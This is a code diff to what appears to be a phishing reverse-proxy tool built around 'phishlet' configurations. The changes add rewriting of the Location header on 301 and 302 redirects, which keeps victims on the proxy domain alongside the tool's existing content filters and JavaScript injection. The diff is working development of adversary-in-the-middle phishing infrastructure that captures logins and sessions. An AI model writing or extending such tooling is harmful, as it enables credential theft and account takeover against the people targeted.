@@ -393,13 +393,14 @@ def apply_reverse_filter_to_request_body(request_body, phishlet_data, proxy_doma
     return request_body
 
 
-def process_phishlet_filters(phishlet_data, request_path, debug_log=None):
+def process_phishlet_filters(phishlet_data, request_path, response_status=None, debug_log=None):
     """
     Process phishlet filters and return a mapping of locate -> replace pairs.
     
     Args:
         phishlet_data: The phishlet configuration data containing filters
         request_path: The current request path for URL-specific filters
+        response_status: The HTTP response status code (used for 302 redirects)
         debug_log: Optional debug logging function
     
     Returns:
@@ -440,6 +441,19 @@ def process_phishlet_filters(phishlet_data, request_path, debug_log=None):
         else:
             if debug_log:
                 debug_log(f"  Skipping non-URL filter: {filter_item.get('type')}", "DEBUG")
+    
+    # if response status is 302 then in header Location value apply replacements
+    if (response_status == 302 or response_status == 301 ) and 'Location' in filter_replacements:
+        # Apply all other replacements to the Location header value
+        location_value = filter_replacements['Location']
+        for locate, replace in filter_replacements.items():
+            if locate != 'Location' and locate in location_value:
+                location_value = location_value.replace(locate, replace)
+                if debug_log:
+                    debug_log(f"Applied replacement to Location header: '{locate}' -> '{replace}'", "DEBUG")
+        filter_replacements['Location'] = location_value
+        if debug_log:
+            debug_log(f"Final Location header value after replacements: {location_value}", "DEBUG")
     
     return filter_replacements
 
@@ -718,4 +732,6 @@ def apply_content_replacements(combined, ordered_replacements, should_apply_repl
         if debug_log:
             debug_log(f"⏭️  Skipping JavaScript injection for non-HTML content type: {content_type}", "DEBUG")
     
+
+
     return combined, request
